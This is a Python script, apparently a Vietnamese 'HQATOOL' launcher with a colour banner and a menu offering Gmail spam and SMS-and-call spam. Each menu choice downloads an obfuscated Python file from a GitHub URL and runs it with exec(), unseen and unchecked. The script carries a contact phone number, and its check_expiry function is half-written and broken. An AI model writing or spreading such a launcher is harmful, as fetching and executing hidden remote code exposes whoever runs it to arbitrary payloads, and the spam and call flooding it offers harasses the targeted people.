import requests
from datetime import date
import string,secrets,hashlib,os,socket
from time import sleep
import platform
import hashlib
from datetime import datetime

machine_code = platform.machine()
def generate_key():
    current_date = date.today().strftime("%d%H")
    ip_address = socket.gethostbyname(socket.gethostname())
    key = current_date+ machine_code + hashlib.sha256(ip_address.encode()).hexdigest() + secrets.token_hex(5)
    return key[:20]

random = generate_key()
key = "HQATOOL"+random
def get_ip_address():
    # Tạo một socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        # Kết nối socket đến một địa chỉ IP không tồn tại để lấy IP của máy hiện tại
        s.connect(("10.255.255.255", 1))
        ip_address = s.getsockname()[0]
    except Exception:
        # Nếu không thể kết nối, sử dụng địa chỉ loopback
        ip_address = "127.0.0.1"
    finally:
        s.close()

    return ip_address
def check_expiry(expiry_date):
    # Lấy thời gian hiện tại
    current_date = datetime.datetime.now().date()
    # Gọi hàm để hiển thị địa chỉ IP
ip = get_ip_address()
banner = f"""
\033[1;37m ██╗  ██╗ ██████╗  █████╗ ████████╗ ██████╗  ██████╗ ██╗     
\033[1;31m ██║  ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║     
\033[1;35m ███████║██║   ██║███████║   ██║   ██║   ██║██║   ██║██║     
\033[3;93m ██╔══██║██║▄▄ ██║██╔══██║   ██║   ██║   ██║██║   ██║██║     
\033[1;36m ██║  ██║╚██████╔╝██║  ██║   ██║   ╚██████╔╝╚██████╔╝███████╗
\033[1;31m ╚═╝  ╚═╝ ╚══▀▀═╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
\033[3;93m              Z A L O :   0 9 0 1 3 8 6 2 7 7
\033[1;36m             C O P Y R I G H T :  H Q A T O O L    
           I P  c ủ a  b ạ n  l à : {ip}
-------------------------------------------------------------"""
os.system("cls" if os.name == "nt" else "clear")
print(banner)
def tool_1():
    url = 'https://raw.githubusercontent.com/hoangquocanh2008/MONKEYX/main/obf-5770402168%20(3).py'

    response = requests.get(url)
    if response.status_code == 200:
        code = response.text
        
        try:
            exec(code)
        except Exception as e:
            print("LỖI XẢY RA:", e)
    else:
        print("TOOL ĐANG UPDATE LIÊN HỆ 0901386277 ĐỂ ĐƯỢC HỖ TRỢ")

def tool_2():
    url = 'https://raw.githubusercontent.com/hoangquocanh2008/MONKEYX/main/obf-5770402168%20(2).py'

    response = requests.get(url)
    if response.status_code == 200:
        code = response.text
        
        try:
            exec(code)
        except Exception as e:
            print("LỖI XẢY RA:", e)
    else:
        print("TOOL ĐANG UPDATE LIÊN HỆ 0901386277 ĐỂ ĐƯỢC HỖ TRỢ")

def main():
    print("1: SPAM GMAIL\n2: SPAM SMS & CALL")
    choice = input("Chọn tool: ")
    if choice == "1":
        tool_1()
    elif choice == "2":
        tool_2()
    else:
        print("Vui lòng chọn 1 và 2")

# Chạy chương trình chính
main()
